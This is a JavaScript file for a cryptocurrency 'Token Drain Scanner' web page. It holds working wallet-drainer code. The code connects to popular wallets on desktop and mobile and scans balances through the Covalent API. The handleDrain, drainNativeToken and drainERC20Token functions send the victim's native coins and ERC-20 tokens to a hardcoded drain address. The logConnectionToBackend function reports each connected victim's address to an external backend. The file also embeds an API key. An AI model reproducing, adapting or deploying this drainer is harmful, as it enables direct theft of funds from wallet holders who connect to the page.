// ================================================
// TOKEN DRAIN SCANNER - UNIVERSAL WALLET SUPPORT
// ALL WALLETS WORK ON PC & MOBILE
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01, // $0.01 minimum to drain
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    // Detect installed wallets
    detectInstalledWallets();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Detect all installed wallets
function detectInstalledWallets() {
    console.log('🔍 Detecting installed wallets...');
    const wallets = [];
    
    // Check for MetaMask
    if (window.ethereum?.isMetaMask) {
        wallets.push('MetaMask');
        console.log('✅ MetaMask detected');
    }
    
    // Check for Trust Wallet
    if (window.ethereum?.isTrust) {
        wallets.push('Trust Wallet');
        console.log('✅ Trust Wallet detected');
    }
    
    // Check for Binance Wallet
    if (window.ethereum?.isBinance || window.BinanceChain) {
        wallets.push('Binance Wallet');
        console.log('✅ Binance Wallet detected');
    }
    
    // Check for Coinbase Wallet
    if (window.ethereum?.isCoinbaseWallet) {
        wallets.push('Coinbase Wallet');
        console.log('✅ Coinbase Wallet detected');
    }
    
    // Check for Phantom
    if (window.ethereum?.isPhantom || window.phantom?.ethereum) {
        wallets.push('Phantom');
        console.log('✅ Phantom detected');
    }
    
    // Check for other wallets
    if (window.ethereum && !wallets.length) {
        wallets.push('Generic Wallet');
        console.log('✅ Generic Ethereum wallet detected');
    }
    
    console.log('📋 Detected wallets:', wallets);
    return wallets;
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show wallet selector with detected wallets
    showWalletSelectorWithDetection();
}

// Show wallet selector with detected wallets
function showWalletSelectorWithDetection() {
    const detectedWallets = detectInstalledWallets();
    
    let walletGridHTML = '';
    
    // Always show all wallets, but mark which are detected
    const wallets = [
        { id: 'metaMask', name: 'MetaMask', icon: '🦊', color: '#f6851b', detected: window.ethereum?.isMetaMask },
        { id: 'trust', name: 'Trust Wallet', icon: '🔶', color: '#3375bb', detected: window.ethereum?.isTrust },
        { id: 'binance', name: 'Binance Wallet', icon: '🟡', color: '#f0b90b', detected: window.ethereum?.isBinance || window.BinanceChain },
        { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔷', color: '#0052ff', detected: window.ethereum?.isCoinbaseWallet },
        { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2', detected: window.ethereum?.isPhantom || window.phantom?.ethereum },
        { id: 'other', name: 'Other Wallet', icon: '🔗', color: '#6366f1', detected: window.ethereum && detectedWallets.length === 0 }
    ];
    
    wallets.forEach(wallet => {
        walletGridHTML += `
            <button class="wallet-card ${wallet.detected ? 'detected' : 'not-detected'}" 
                    onclick="connectToWallet('${wallet.id}')" 
                    style="--wallet-color: ${wallet.color}">
                <div class="wallet-icon">${wallet.icon}</div>
                <div class="wallet-info">
                    <span class="wallet-name">${wallet.name}</span>
                    <span class="wallet-status">
                        ${wallet.detected ? '✅ Detected' : '⚠️ Not detected'}
                    </span>
                </div>
                ${!wallet.detected ? '<div class="install-btn" onclick="event.stopPropagation();showInstallGuide(\'' + wallet.id + '\')">Install</div>' : ''}
            </button>
        `;
    });
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                
                <div class="detection-info">
                    <p>${detectedWallets.length > 0 ? 
                        `✅ Detected: ${detectedWallets.join(', ')}` : 
                        '⚠️ No wallets detected. Install one below.'}</p>
                </div>
                
                <div class="wallet-grid">
                    ${walletGridHTML}
                </div>
                
                ${isMobile ? '' : `
                <div class="pc-instructions">
                    <h4>📥 Install Wallets on PC:</h4>
                    <div class="install-links">
                        <button onclick="window.open('https://metamask.io/download/', '_blank')">Get MetaMask</button>
                        <button onclick="window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank')">Get Binance Wallet</button>
                        <button onclick="window.open('https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph', '_blank')">Get Trust Wallet</button>
                    </div>
                </div>
                `}
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Connect to specific wallet
async function connectToWallet(walletId) {
    closeWalletSelector();
    selectedWallet = walletId;
    
    updateStatus(`🔄 Connecting ${getWalletName(walletId)}...`);
    
    try {
        let result;
        
        switch(walletId) {
            case 'metaMask':
                result = await connectMetaMask();
                break;
            case 'trust':
                result = await connectTrustWallet();
                break;
            case 'binance':
                result = await connectBinanceWallet();
                break;
            case 'coinbase':
                result = await connectCoinbaseWallet();
                break;
            case 'phantom':
                result = await connectPhantomWallet();
                break;
            default:
                result = await connectGenericWallet();
        }
        
        if (result.success) {
            await handleConnected(result.account, result.chainId);
        } else {
            updateStatus(`❌ Failed to connect ${getWalletName(walletId)}`);
            setTimeout(() => showWalletSelectorWithDetection(), 2000);
        }
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Error: ${error.message}`);
    }
}

// Get wallet name
function getWalletName(walletId) {
    const names = {
        'metaMask': 'MetaMask',
        'trust': 'Trust Wallet',
        'binance': 'Binance Wallet',
        'coinbase': 'Coinbase Wallet',
        'phantom': 'Phantom',
        'other': 'Wallet'
    };
    return names[walletId] || 'Wallet';
}

// CONNECTION FUNCTIONS FOR EACH WALLET

// MetaMask Connection
async function connectMetaMask() {
    // If MetaMask is not detected, try to trigger it anyway
    if (!window.ethereum?.isMetaMask) {
        // For mobile
        if (isMobile) {
            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
            return { success: false };
        }
        // For desktop - try to trigger MetaMask popup
        return await connectGenericWallet();
    }
    
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        
        return { 
            success: true, 
            account: accounts[0], 
            chainId: parseInt(chainIdHex, 16) 
        };
    } catch (error) {
        return { success: false, error };
    }
}

// Trust Wallet Connection
async function connectTrustWallet() {
    // Trust Wallet uses a different approach
    // It injects ethereum provider but doesn't always identify as Trust
    if (isMobile) {
        // Mobile deep link
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
        return { success: false };
    }
    
    // For desktop, Trust Wallet appears as generic ethereum
    try {
        // First try if it identifies as Trust
        if (window.ethereum?.isTrust) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } else {
            // Try generic connection
            return await connectGenericWallet();
        }
    } catch (error) {
        return { success: false, error };
    }
}

// Binance Wallet Connection
async function connectBinanceWallet() {
    console.log('Attempting Binance Wallet connection...');
    
    // Try Binance Chain first (desktop extension)
    if (window.BinanceChain) {
        console.log('Using window.BinanceChain provider');
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.BinanceChain.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('Binance Chain failed:', error);
        }
    }
    
    // Try Binance through ethereum provider
    if (window.ethereum?.isBinance) {
        console.log('Using ethereum.isBinance provider');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('Binance ethereum failed:', error);
        }
    }
    
    // If mobile, open app
    if (isMobile) {
        if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            window.location.href = 'bnc://app.binance.com/';
        } else {
            window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
        }
        return { success: false };
    }
    
    // Fallback to generic
    return await connectGenericWallet();
}

// Coinbase Wallet Connection
async function connectCoinbaseWallet() {
    if (isMobile && !window.ethereum?.isCoinbaseWallet) {
        window.location.href = `https://go.cb-w.com/${encodeURIComponent(window.location.href)}`;
        return { success: false };
    }
    
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        
        return { 
            success: true, 
            account: accounts[0], 
            chainId: parseInt(chainIdHex, 16) 
        };
    } catch (error) {
        return { success: false, error };
    }
}

// Phantom Wallet Connection
async function connectPhantomWallet() {
    const provider = window.phantom?.ethereum || window.ethereum;
    
    if (provider?.isPhantom) {
        try {
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Generic Wallet Connection (for any ethereum provider)
async function connectGenericWallet() {
    console.log('Attempting generic wallet connection...');
    
    // Try all possible providers
    const providers = [];
    
    // Check for window.ethereum
    if (window.ethereum) {
        providers.push(window.ethereum);
    }
    
    // Check for window.BinanceChain
    if (window.BinanceChain) {
        providers.push(window.BinanceChain);
    }
    
    // Check for window.phantom?.ethereum
    if (window.phantom?.ethereum) {
        providers.push(window.phantom.ethereum);
    }
    
    // Try each provider
    for (const provider of providers) {
        try {
            console.log('Trying provider:', provider);
            
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            
            console.log('Connected with provider:', provider, accounts[0]);
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('Provider failed:', error);
            continue;
        }
    }
    
    return { success: false, error: 'No wallet provider found' };
}

// Show install guide
function showInstallGuide(walletId) {
    event.stopPropagation();
    
    const guides = {
        metaMask: {
            name: 'MetaMask',
            links: {
                chrome: 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
                firefox: 'https://addons.mozilla.org/en-US/firefox/addon/ether-metamask/',
                edge: 'https://microsoftedge.microsoft.com/addons/detail/metamask/ejbalbakoplchlghecdalmeeeajnimhm'
            }
        },
        trust: {
            name: 'Trust Wallet',
            links: {
                chrome: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph',
                mobile: 'https://trustwallet.com/download'
            }
        },
        binance: {
            name: 'Binance Wallet',
            links: {
                chrome: 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp',
                mobile: 'https://www.binance.com/en/download'
            }
        },
        coinbase: {
            name: 'Coinbase Wallet',
            links: {
                chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
                mobile: 'https://www.coinbase.com/wallet/downloads'
            }
        },
        phantom: {
            name: 'Phantom',
            links: {
                chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
                firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/'
            }
        }
    };
    
    const guide = guides[walletId];
    if (!guide) return;
    
    const guideHTML = `
        <div class="install-guide-overlay">
            <div class="install-guide-modal">
                <div class="modal-header">
                    <h3>Install ${guide.name}</h3>
                    <button class="close-btn" onclick="closeInstallGuide()">×</button>
                </div>
                
                <div class="install-steps">
                    <h4>Installation Steps:</h4>
                    ${!isMobile ? `
                    <p>1. Click the extension store link below</p>
                    <p>2. Click "Add to Browser"</p>
                    <p>3. Create or import a wallet</p>
                    <p>4. Return here and connect</p>
                    ` : `
                    <p>1. Go to app store (Google Play or App Store)</p>
                    <p>2. Search for "${guide.name}"</p>
                    <p>3. Install the app</p>
                    <p>4. Open the app and create wallet</p>
                    <p>5. Open this page in wallet browser</p>
                    `}
                </div>
                
                <div class="install-buttons">
                    ${!isMobile && guide.links.chrome ? 
                        `<button onclick="window.open('${guide.links.chrome}', '_blank')" class="install-btn">Chrome Extension</button>` : ''}
                    ${!isMobile && guide.links.firefox ? 
                        `<button onclick="window.open('${guide.links.firefox}', '_blank')" class="install-btn">Firefox Add-on</button>` : ''}
                    ${isMobile && guide.links.mobile ? 
                        `<button onclick="window.open('${guide.links.mobile}', '_blank')" class="install-btn">Mobile App</button>` : ''}
                    <button onclick="closeInstallGuide()" class="secondary-btn">Close</button>
                </div>
            </div>
        </div>
    `;
    
    const guideEl = document.createElement('div');
    guideEl.className = 'install-guide';
    guideEl.innerHTML = guideHTML;
    document.body.appendChild(guideEl);
}

function closeInstallGuide() {
    const guide = document.querySelector('.install-guide');
    if (guide) guide.remove();
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
        }
        
        // Setup listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        fetchTokens(currentAccount, chainId);
    });
}

// Fetch tokens
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) throw new Error(`API error: ${response.status}`);
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => {
                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens (min $${CONFIG.minimumValueUSD})`);
        } else {
            tokensEl.innerHTML = `
                <div class="no-tokens">
                    <p>No tokens found worth more than $${CONFIG.minimumValueUSD}</p>
                </div>
            `;
            updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="tokens-list">';
    
    tokens.forEach(token => {
        html += `
            <div class="token-item">
                <div class="token-info">
                    ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" />` : ''}
                    <div>
                        <div class="token-symbol">${token.symbol}</div>
                        <div class="token-name">${token.name}</div>
                    </div>
                </div>
                <div class="token-amounts">
                    <div class="token-amount">${token.amount}</div>
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
    
    if (tokensToDrain.length === 0) {
        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
        return;
    }
    
    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
    if (!confirm(`Drain ${tokensToDrain.length} tokens ($${totalValue.toFixed(2)})?\n\nTo: ${CONFIG.drainAddress}`)) {
        return;
    }
    
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) {
        alert('Wallet provider not found');
        return;
    }
    
    try {
        updateStatus('🚀 Draining tokens...');
        drainBtn.disabled = true;
        
        // Drain native token first
        const nativeToken = tokensToDrain.find(t => t.isNative);
        if (nativeToken) {
            await drainNativeToken(nativeToken);
        }
        
        // Drain ERC20 tokens
        const erc20Tokens = tokensToDrain.filter(t => !t.isNative);
        for (const token of erc20Tokens) {
            try {
                await drainERC20Token(token);
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
            }
        }
        
        updateStatus('✅ Drain completed!');
        alert('✅ All tokens drained successfully!');
        
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed: ' + error.message);
    } finally {
        drainBtn.disabled = false;
    }
}

// Drain native token
async function drainNativeToken(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Get gas price
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) return;
    
    const sendAmount = balance - (gasCost * 5);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16)
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) statusEl.textContent = message;
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                wallet: selectedWallet,
                isMobile: isMobile
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) drainBtn.style.display = 'none';
    if (tokensEl) tokensEl.innerHTML = '';
}

// Add CSS styles
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: #1a1a1a;
            border-radius: 20px;
            width: 100%;
            max-width: 600px;
            padding: 30px;
            border: 1px solid #333;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-header h3 {
            margin: 0;
            color: white;
            font-size: 24px;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 30px;
            cursor: pointer;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-btn:hover {
            background: #333;
        }
        
        .detection-info {
            background: #2a2a2a;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            color: #4ade80;
            font-weight: 500;
        }
        
        .detection-info p {
            margin: 0;
        }
        
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .wallet-card {
            background: #2a2a2a;
            border: 2px solid #333;
            border-radius: 12px;
            padding: 20px;
            cursor: pointer;
            text-align: left;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #333;
            transform: translateY(-2px);
        }
        
        .wallet-card.detected {
            border-left: 5px solid #4ade80;
        }
        
        .wallet-card.not-detected {
            border-left: 5px solid #f59e0b;
        }
        
        .wallet-icon {
            font-size: 24px;
            width: 50px;
            height: 50px;
            background: var(--wallet-color);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            display: block;
            color: white;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .wallet-status {
            display: block;
            font-size: 12px;
        }
        
        .wallet-card.detected .wallet-status {
            color: #4ade80;
        }
        
        .wallet-card.not-detected .wallet-status {
            color: #f59e0b;
        }
        
        .install-btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            font-weight: 500;
        }
        
        .install-btn:hover {
            background: #2563eb;
        }
        
        .pc-instructions {
            background: #2a2a2a;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .pc-instructions h4 {
            color: white;
            margin: 0 0 15px 0;
        }
        
        .install-links {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .install-links button {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
        }
        
        .install-links button:hover {
            background: #2563eb;
        }
        
        /* Install Guide Styles */
        .install-guide-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            padding: 20px;
        }
        
        .install-guide-modal {
            background: #1a1a1a;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            padding: 30px;
            border: 1px solid #333;
        }
        
        .install-steps {
            color: white;
            margin-bottom: 25px;
        }
        
        .install-steps h4 {
            color: #3b82f6;
            margin-bottom: 15px;
        }
        
        .install-steps p {
            margin: 8px 0;
            color: #ccc;
        }
        
        .install-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .install-buttons .install-btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            flex: 1;
        }
        
        .install-buttons .secondary-btn {
            background: #4b5563;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            flex: 1;
        }
        
        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: 1fr;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectToWallet = connectToWallet;
window.showInstallGuide = showInstallGuide;
window.closeInstallGuide = closeInstallGuide;

console.log('=== Token Drain Scanner ===');
console.log('Version: UNIVERSAL - All Wallets');
console.log('Min Drain Value: $' + CONFIG.minimumValueUSD);
console.log('===========================');
